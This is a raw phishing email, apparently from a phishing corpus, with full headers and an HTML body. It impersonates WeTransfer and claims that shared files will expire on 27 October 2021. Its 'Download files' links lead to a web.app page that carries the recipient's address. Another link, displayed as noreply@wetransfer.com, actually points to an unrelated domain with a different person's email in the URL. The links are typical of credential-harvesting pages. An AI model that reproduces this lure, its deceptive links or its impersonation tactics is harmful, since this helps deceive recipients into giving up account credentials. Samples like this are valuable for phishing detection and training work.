@@ -1,0 +1,115 @@
+Return-Path: abuse@slimexo.com
+Delivered-To: jose@monkey.org
+X-FDA: 78734280030.02.2BF1C2F
+Received: from sl.slimexo.com (sl.slimexo.com [178.210.237.37])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 5C08F800CAA1
+	for <jose@monkey.org>; Mon, 25 Oct 2021 08:27:15 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=sl; d=slimexo.com;
+ h=Reply-To:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@slimexo.com;
+ bh=wXVhcj0ex/jzGYqtbYvRTXfucGKBwR0UdnSSDPD+FEE=; =?utf-8?q?b=3DbcQHjQCXHmVY?=
+ =?utf-8?q?AJaxpv4dCCTcYdZZPlD+lWdQe4GoBCIHmmh7rxphFJwmLT02/NFAOLCPUAwk8iw8?=
+  
+ y1erSeCOSDgLaIIkZes9n9iexklRSpiQrmQ6iPXxoI9vVlAWY1M2mWwzT9vVoXL/xlA7wytXZvy1
+  
+ 6+4PHcHBuTPInZjUTp2r2lvmUdKDrQj272Z1C0rx4Zj5KyRVJVpAawb2jgKgZ4sFf2y9FjBfYFsx
+  
+ KtDLPFMrOF29ZHX4jSSJXRxkxnFmQYvzZwjRqzjykOHyafBm6wWBQMePdObs6qAHN1c3Sj9frS9e
+   0qr43n/Od6MhrB3aQLdgT/HoTtNR/MZyVrp8zQ==
+Reply-To: info@slimexo.com
+From: WeTransfer<info@slimexo.com>
+To: jose@monkey.org
+Subject: File will expire soon-56830367
+Date: 24 Oct 2021 21:21:04 -0700
+Message-ID: <20211024212104.7FBF8C87D4415B5B@slimexo.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=-2.30
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 5C08F800CAA1
+X-Stat-Signature: qambohuwez3aos9j1nkiojuufkuwfupi
+Authentication-Results: imf16.b.hostedemail.com;	dkim=pass
+ header.d=slimexo.com header.s=sl header.b=bcQHjQCX;	spf=pass
+ (imf16.b.hostedemail.com: domain of abuse@slimexo.com designates
+ 178.210.237.37 as permitted sender) smtp.mailfrom=abuse@slimexo.com;
+	dmarc=pass (policy=reject) header.from=slimexo.com
+X-HE-Tag: 1635150435-69474
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 86
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: arial, h=
+elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
+px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
+E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial">Click<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN><SPAN sty=
+le=3D"BOX-SIZING: border-box">&nbsp;</SPAN><SPAN>&nbsp;</SPAN><SPAN role=3D=
+link id=3DOBJ_PREFIX_DWT238_com_zimbra_url class=3DObject style=3D"CURSOR: =
+pointer; TEXT-DECORATION: none; COLOR: rgb(0,90,149)"><A style=3D"BOX-SIZIN=
+G: border-box; CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(17,85,204=
+); BACKGROUND-COLOR: transparent" href=3D"https://i2f-d2v0lwrvy2zpbgu-downl=
+oad.web.app/#jose@monkey.org" rel=3Dnoreferrer target=3D_blank>
+ 'Download images'<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN></A><=
+/SPAN>to view images<BR style=3D"BOX-SIZING: border-box"><SPAN role=3Dlink =
+id=3DOBJ_PREFIX_DWT239_ZmEmailObjectHandler class=3DObject style=3D"CURSOR:=
+ pointer; TEXT-DECORATION: none; COLOR: rgb(0,90,149)"><FONT color=3D#22222=
+2>jose@monkey.org</FONT></SPAN>,<BR style=3D"BOX-SIZING: border-box">You ju=
+st received some files via<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SP=
+AN><SPAN class=3Dv1il style=3D"BOX-SIZING: border-box">
+ <SPAN id=3DDWT241 class=3DZmSearchResult style=3D"BACKGROUND-COLOR: rgb(25=
+5,254,196)">WeTransfer</SPAN></SPAN>.<BR style=3D"BOX-SIZING: border-box">2=
+ file, 915 KB in Total and will be deleted on<SPAN>&nbsp;27</SPAN><SPAN rol=
+e=3Dlink id=3DOBJ_PREFIX_DWT242_com_zimbra_date class=3DObject style=3D"CUR=
+SOR: pointer; TEXT-DECORATION: none; COLOR: rgb(0,90,149)">th October, 2021=
+</SPAN>.</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: arial, h=
+elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
+px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
+E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial"><SPAN role=3Dlink id=3DOBJ_PREFIX_DWT243_com_zimbra_url class=3DOb=
+ject style=3D"CURSOR: pointer; TEXT-DECORATION: none; COLOR: rgb(0,90,149)"=
+><A style=3D"BOX-SIZING: border-box; CURSOR: pointer; TEXT-DECORATION: none=
+; COLOR: rgb(17,85,204); BACKGROUND-COLOR: transparent" href=3D"https://i2f=
+-d2v0lwrvy2zpbgu-download.web.app/#jose@monkey.org" rel=3Dnoreferrer target=
+=3D_blank>Download files</A></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: arial, h=
+elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
+px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
+E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial">Get your files</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: arial, h=
+elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0=
+px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYL=
+E: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color:=20
+initial"><BR style=3D"BOX-SIZING: border-box">To make sure our emails arriv=
+e, please add<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN><SPAN role=
+=3Dlink id=3DOBJ_PREFIX_DWT244_com_zimbra_url class=3DObject style=3D"CURSO=
+R: pointer; TEXT-DECORATION: none; COLOR: rgb(0,90,149)">
+ <A style=3D"BOX-SIZING: border-box; CURSOR: pointer; TEXT-DECORATION: none=
+; COLOR: rgb(17,85,204); BACKGROUND-COLOR: transparent" href=3D"https://gre=
+eculture.com/cdd/we/index.html?email=3Dstanco.attila@vaciegyhazmegye.hu" re=
+l=3Dnoreferrer target=3D_blank>noreply@<SPAN class=3Dv1il style=3D"BOX-SIZI=
+NG: border-box">wetransfer</SPAN>.com</A></SPAN><SPAN style=3D"BOX-SIZING: =
+border-box">&nbsp;</SPAN>to your contacts.</P></BODY></HTML>
+
